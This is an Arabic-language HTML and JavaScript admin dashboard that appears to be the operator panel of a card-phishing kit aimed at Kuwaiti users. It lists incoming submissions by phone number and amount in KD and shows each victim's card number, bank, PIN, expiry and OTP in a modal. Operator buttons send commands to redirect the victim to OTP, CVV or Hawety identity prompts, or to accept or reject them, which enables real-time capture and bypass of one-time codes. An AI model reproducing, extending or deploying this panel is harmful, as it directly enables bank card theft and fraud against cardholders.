<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم</title>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #ffffff; color: #333; min-height: 100vh; padding: 15px; }
        
        .header { background: #fff; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #e94560; margin-bottom: 15px; }
        .header h1 { color: #e94560; font-size: 18px; }
        .header .status { display: flex; align-items: center; gap: 6px; font-size: 13px; }
        .header .status .dot { width: 8px; height: 8px; border-radius: 50%; background: #28a745; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        
        .entries-list { display: flex; flex-direction: column; gap: 10px; }
        
        .entry-row { background: #fff; border: 1px solid #e0e0e0; border-radius: 8px; padding: 12px 15px; display: flex; align-items: center; gap: 15px; }
        .entry-row .phone { font-weight: bold; font-size: 15px; color: #333; min-width: 110px; }
        .entry-row .amount { font-size: 14px; color: #e94560; font-weight: bold; min-width: 70px; }
        .entry-row .card-btn { background: #28a745; color: #fff; border: none; padding: 8px 16px; border-radius: 5px; cursor: pointer; font-size: 13px; font-weight: bold; }
        .entry-row .card-btn:hover { background: #218838; }
        .entry-row .time { font-size: 11px; color: #999; margin-right: auto; }
        
        /* Modal / Detail Panel */
        .modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
        .modal-overlay.active { display: flex; }
        
        .modal { background: #fff; border-radius: 12px; padding: 25px; width: 90%; max-width: 450px; position: relative; }
        .modal .close-btn { position: absolute; top: 10px; left: 10px; background: none; border: none; font-size: 22px; cursor: pointer; color: #999; }
        .modal .close-btn:hover { color: #333; }
        
        .modal h2 { color: #333; font-size: 16px; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
        
        .detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
        .detail-item { }
        .detail-item .label { font-size: 11px; color: #999; margin-bottom: 3px; }
        .detail-item .value { font-size: 14px; font-weight: bold; color: #333; }
        .detail-item.full { grid-column: 1 / -1; }
        .detail-item .value.card-number { font-size: 16px; letter-spacing: 1px; color: #000; direction: ltr; text-align: right; }
        
        .control-buttons { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee; }
        .ctrl-btn { padding: 10px 18px; border: none; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: bold; flex: 1; min-width: 100px; text-align: center; }
        .ctrl-btn:hover { opacity: 0.85; transform: translateY(-1px); }
        .ctrl-btn.otp { background: #ffa500; color: #fff; }
        .ctrl-btn.cvv { background: #17a2b8; color: #fff; }
        .ctrl-btn.hawety { background: #6f42c1; color: #fff; }
        .ctrl-btn.reject { background: #dc3545; color: #fff; }
        .ctrl-btn.accept { background: #28a745; color: #fff; }
        
        .empty-state { text-align: center; padding: 60px 20px; color: #ccc; font-size: 16px; }
        
        .notification { position: fixed; top: 15px; left: 50%; transform: translateX(-50%); background: #28a745; color: #fff; padding: 10px 20px; border-radius: 6px; font-weight: bold; font-size: 13px; z-index: 2000; display: none; }
        
        .clear-btn { background: #dc3545; color: #fff; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>لوحة التحكم</h1>
        <div class="status">
            <button class="clear-btn" onclick="clearAll()">مسح الكل</button>
            <div class="dot"></div>
            <span>متصل</span>
        </div>
    </div>

    <div class="notification" id="notification"></div>

    <div class="entries-list" id="entriesList">
        <div class="empty-state">في انتظار بيانات جديدة...</div>
    </div>

    <!-- Modal for card details -->
    <div class="modal-overlay" id="modalOverlay">
        <div class="modal">
            <button class="close-btn" onclick="closeModal()">&times;</button>
            <h2>تفاصيل البطاقة</h2>
            <div class="detail-grid">
                <div class="detail-item full">
                    <div class="label">رقم البطاقة</div>
                    <div class="value card-number" id="modalCardNumber">-</div>
                </div>
                <div class="detail-item">
                    <div class="label">البنك</div>
                    <div class="value" id="modalBank">-</div>
                </div>
                <div class="detail-item">
                    <div class="label">PIN</div>
                    <div class="value" id="modalPin">-</div>
                </div>
                <div class="detail-item">
                    <div class="label">تاريخ الانتهاء</div>
                    <div class="value" id="modalExpiry">-</div>
                </div>
                <div class="detail-item">
                    <div class="label">OTP</div>
                    <div class="value" id="modalOtp" style="color:#ffa500;">-</div>
                </div>
            </div>
            <div class="control-buttons">
                <button class="ctrl-btn otp" id="btnOtp" onclick="sendCmd('otp')">نقل لـ OTP</button>
                <button class="ctrl-btn cvv" id="btnCvv" onclick="sendCmd('cvv')">نقل لـ CVV</button>
                <button class="ctrl-btn hawety" id="btnHawety" onclick="sendCmd('hawety')">نقل لهويتي</button>
                <button class="ctrl-btn accept" id="btnAccept" onclick="sendCmd('Accept')">قبول</button>
                <button class="ctrl-btn reject" id="btnReject" onclick="sendCmd('Reject')">رفض</button>
            </div>
        </div>
    </div>

    <script>
        let submissions = [];
        let currentPid = null;

        // Initialize Pusher
        Pusher.logToConsole = false;
        const pusher = new Pusher('d1868eff0961af03482e', { cluster: 'ap2' });
        const adminChannel = pusher.subscribe('admin-channel');
        
        adminChannel.bind('new-submission', function(data) {
            submissions.push(data);
            renderEntries();
            showNotification('طلب جديد!');
            playSound();
        });

        adminChannel.bind('update-submission', function(data) {
            const idx = submissions.findIndex(s => s.id == data.id);
            if (idx >= 0) {
                submissions[idx] = data;
                renderEntries();
                // Update modal if open
                if (currentPid == data.pid) {
                    openModal(data.pid);
                }
                showNotification('تم تحديث البيانات');
                playSound();
            }
        });

        // Load existing
        fetch('/api/submissions')
            .then(r => r.json())
            .then(data => { submissions = data; renderEntries(); });

        function renderEntries() {
            const list = document.getElementById('entriesList');
            if (submissions.length === 0) {
                list.innerHTML = '<div class="empty-state">في انتظار بيانات جديدة...</div>';
                return;
            }
            list.innerHTML = submissions.slice().reverse().map(sub => `
                <div class="entry-row">
                    <div class="phone">${sub.phone || '-'}</div>
                    <div class="amount">${sub.amount || '-'} KD</div>
                    <button class="card-btn" onclick="openModal('${sub.pid}')">البطاقة</button>
                    <div class="time">${new Date(sub.timestamp).toLocaleTimeString('ar-EG')}</div>
                </div>
            `).join('');
        }

        function openModal(pid) {
            currentPid = pid;
            const sub = submissions.find(s => s.pid == pid);
            if (!sub) return;
            
            document.getElementById('modalCardNumber').textContent = (sub.cardPrefix || '') + (sub.cardNumber || '-');
            document.getElementById('modalBank').textContent = sub.bank || '-';
            document.getElementById('modalPin').textContent = sub.pin || '-';
            document.getElementById('modalExpiry').textContent = (sub.expMonth || '--') + '/' + (sub.expYear || '--');
            document.getElementById('modalOtp').textContent = sub.otp || '-';
            
            document.getElementById('modalOverlay').classList.add('active');
        }

        function closeModal() {
            document.getElementById('modalOverlay').classList.remove('active');
            currentPid = null;
        }

        function sendCmd(command) {
            if (!currentPid) return;
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: command, pid: currentPid })
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    showNotification('تم إرسال: ' + command);
                }
            });
        }

        function clearAll() {
            if (confirm('مسح جميع الطلبات؟')) {
                fetch('/api/clear', { method: 'POST' })
                    .then(r => r.json())
                    .then(() => { submissions = []; renderEntries(); closeModal(); });
            }
        }

        function showNotification(msg) {
            const n = document.getElementById('notification');
            n.textContent = msg;
            n.style.display = 'block';
            setTimeout(() => { n.style.display = 'none'; }, 2500);
        }

        function playSound() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.connect(gain); gain.connect(ctx.destination);
                osc.frequency.value = 800; gain.gain.value = 0.3;
                osc.start();
                setTimeout(() => { osc.stop(); ctx.close(); }, 200);
            } catch(e) {}
        }

        // Click outside modal to close
        document.getElementById('modalOverlay').addEventListener('click', function(e) {
            if (e.target === this) closeModal();
        });

        // Auto-refresh
        setInterval(() => {
            fetch('/api/submissions')
                .then(r => r.json())
                .then(data => {
                    if (JSON.stringify(data) !== JSON.stringify(submissions)) {
                        submissions = data;
                        renderEntries();
                    }
                });
        }, 5000);
    </script>
</body>
</html>
